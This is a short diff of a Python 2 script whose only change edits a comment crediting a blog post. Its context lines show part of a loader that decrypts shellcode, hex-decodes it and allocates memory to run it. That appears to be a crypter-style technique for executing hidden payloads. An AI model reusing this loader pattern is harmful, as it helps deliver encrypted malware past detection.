@@ -42,8 +42,8 @@ print 'Executing...'
 
 shellcode = decrypted.replace('\\x', '').decode('hex')
 
-# thanks to hacktracking for that snip
-# hacktracking.blogspot.ca/2015/05/execute-shellcode-in-python.html
+# Thanks to hacktracking for that snip
+# http://hacktracking.blogspot.ca/2015/05/execute-shellcode-in-python.html
 sc = c_char_p(shellcode)
 size = len(shellcode)
 addr = c_void_p(libc.valloc(size))
